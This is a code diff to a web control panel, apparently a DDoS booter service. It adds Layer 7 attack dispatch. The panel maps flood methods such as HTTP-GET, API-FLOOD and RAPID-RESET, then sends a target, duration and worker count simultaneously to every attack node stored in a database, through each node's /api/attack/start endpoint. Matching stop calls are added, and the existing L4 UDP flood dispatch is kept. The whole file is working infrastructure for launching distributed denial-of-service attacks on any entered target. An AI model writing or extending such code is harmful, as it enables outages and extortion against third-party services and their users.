@@ -212,16 +212,16 @@ export default function Panel() {
     const startedAt = new Date().toISOString();
     dbg("info", `Launch started — layer=${layer} method=${method} target=${target.trim()} duration=${duration}s`);
 
-    // ── Fire real API calls for L4 UDP methods ──────────────────────────
+    // ── Fire real API calls ──────────────────────────────────────────────
     let apiInstances = {};
 
     if (layer === "L4" && (method === "UDP-NORMAL" || method === "UDP-BYPASS")) {
-      // Fetch API list
+      // ── L4: fetch nodes and fire /api/hit ────────────────────────────
       const { data: apis, error: apiFetchErr } = await supabase.from("layer4_apis").select("url");
       if (apiFetchErr) {
         dbg("error", "Failed to fetch layer4_apis from DB", apiFetchErr.message);
       } else {
-        dbg("info", `Fetched ${apis?.length ?? 0} API node(s) from DB`);
+        dbg("info", `Fetched ${apis?.length ?? 0} L4 API node(s) from DB`);
       }
 
       if (apis && apis.length > 0) {
@@ -231,9 +231,8 @@ export default function Panel() {
             : { method: 2, ip: target.trim(), time: duration };
 
         dbg("info", `Request body`, body);
-        dbg("info", `Firing all ${apis.length} node(s) simultaneously (15 s timeout each)…`);
+        dbg("info", `Firing all ${apis.length} L4 node(s) simultaneously (15 s timeout each)…`);
 
-        // Fire every node simultaneously regardless of online/offline status
         const results = await Promise.allSettled(
           apis.map((api) => {
             const controller = new AbortController();
@@ -276,13 +275,92 @@ export default function Panel() {
 
         dbg(
           onlineCount > 0 ? "info" : "warn",
-          `Result: ${onlineCount}/${apis.length} node(s) responded`
+          `Result: ${onlineCount}/${apis.length} L4 node(s) responded`
         );
         setLaunchInfo(`${onlineCount}/${apis.length} node(s) online`);
       } else {
         dbg("warn", "No API nodes registered in layer4_apis table");
         setLaunchInfo("No API nodes registered");
       }
+
+    } else if (layer === "L7") {
+      // ── L7: fetch nodes and fire /api/attack/start ───────────────────
+      // Map internal method names → L7 API method strings
+      const L7_METHOD_MAP = {
+        "HTTP-GET":    "GET",
+        "HTTP-POST":   "POST",
+        "API-FLOOD":   "API-FLOOD",
+        "RAPID-RESET": "RAPID-RESET",
+      };
+      const apiMethod = L7_METHOD_MAP[method] ?? method;
+
+      const { data: apis, error: apiFetchErr } = await supabase.from("layer7_apis").select("url");
+      if (apiFetchErr) {
+        dbg("error", "Failed to fetch layer7_apis from DB", apiFetchErr.message);
+      } else {
+        dbg("info", `Fetched ${apis?.length ?? 0} L7 API node(s) from DB`);
+      }
+
+      if (apis && apis.length > 0) {
+        const body = {
+          target:     target.trim(),
+          method:     apiMethod,
+          duration,
+          workers:    10,
+          verbose:    false,
+          rate_delay: 100,
+        };
+
+        dbg("info", `Request body`, body);
+        dbg("info", `Firing all ${apis.length} L7 node(s) simultaneously (15 s timeout each)…`);
+
+        const results = await Promise.allSettled(
+          apis.map((api) => {
+            const controller = new AbortController();
+            const timer = setTimeout(() => controller.abort(), 15000);
+            const url = `${api.url}/api/attack/start`;
+            return fetch(url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(body),
+              signal: controller.signal,
+            })
+              .then((r) => {
+                if (!r.ok) throw new Error(`HTTP ${r.status} ${r.statusText}`);
+                return r.json();
+              })
+              .then((data) => ({ url: api.url, data }))
+              .catch((err) => { throw { url: api.url, err }; })
+              .finally(() => clearTimeout(timer));
+          })
+        );
+
+        let onlineCount = 0;
+        results.forEach((r, i) => {
+          const apiUrl = apis[i].url;
+          if (r.status === "fulfilled") {
+            onlineCount++;
+            apiInstances[r.value.url] = true;
+            dbg("info", `✓ ${apiUrl} → attack started`, r.value.data);
+          } else {
+            const rawErr = r.reason;
+            const errMsg = rawErr?.err?.name === "AbortError"
+              ? "timed out (15 s)"
+              : rawErr?.err?.message ?? rawErr?.message ?? String(rawErr);
+            dbg("warn", `✗ ${apiUrl} → ${errMsg}`);
+          }
+        });
+
+        dbg(
+          onlineCount > 0 ? "info" : "warn",
+          `Result: ${onlineCount}/${apis.length} L7 node(s) responded`
+        );
+        setLaunchInfo(`${onlineCount}/${apis.length} node(s) online`);
+      } else {
+        dbg("warn", "No API nodes registered in layer7_apis table");
+        setLaunchInfo("No API nodes registered");
+      }
+
     } else {
       dbg("info", `Method ${method} does not use API nodes — skipping API dispatch`);
     }
@@ -322,13 +400,22 @@ export default function Panel() {
   }
 
   async function stopRun(id, _table) {
-    const layer = _table === "l4_runs" ? "L4" : "L7";
-    // Fire /api/stop/all to every API server simultaneously (L4 only)
-    if (layer === "L4") {
+    const runLayer = _table === "l4_runs" ? "L4" : "L7";
+
+    if (runLayer === "L4") {
+      // Fire /api/stop/all to every L4 node simultaneously
       const { data: apis } = await supabase.from("layer4_apis").select("url");
       if (apis && apis.length > 0) {
         await Promise.allSettled(
           apis.map((api) => fetch(`${api.url}/api/stop/all`, { method: "POST" }))
+        );
+      }
+    } else {
+      // Fire /api/attack/stop to every L7 node simultaneously
+      const { data: apis } = await supabase.from("layer7_apis").select("url");
+      if (apis && apis.length > 0) {
+        await Promise.allSettled(
+          apis.map((api) => fetch(`${api.url}/api/attack/stop`, { method: "POST" }))
         );
       }
     }
